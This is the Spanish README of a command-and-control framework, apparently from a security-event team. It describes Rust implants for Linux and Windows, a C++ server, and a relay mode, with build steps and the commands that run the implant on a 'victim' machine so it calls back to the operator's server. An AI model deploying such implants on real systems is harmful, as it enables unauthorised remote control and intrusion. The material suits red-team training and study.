# El pikachu C2
Un increible e impresionante C2 hecho por elpikachu

## Team: Sexy-AllpAcks - SecOps Days Lima
@elpikachu, @s4yhii, @gatomon

## Features
- Implant linux & windows
- Implantes hechos en Rust ❤️
- Server en C++
- Multisesion
- Port Forwarding / Relay Mode
- Esta chido

## Como compilar
### dependencias:
- rustup
- mingw
- g++

Para el server:
```sh
cd server
make 
```
Para el implante:
```sh
cd implant

# Linux
make linux

# Windows
make windows
```

## Como usar

En el server
```sh
./server <port>
```


En el equipo victima

```sh
# Windows
./pika.exe <ip> <port>

# Linux
./pika <ip> <port>
```

En un pivot
```sh
# Linux (For unprivileged remember use port > 1024)
./pika <ip> <port> <relay_port>
```


## Help
```sh
c2> help
sessions              list sessions
console <session_id>  interact with session
help                  show this help
exit                  quit server

#dentro de la consola
back                  return to cli
```
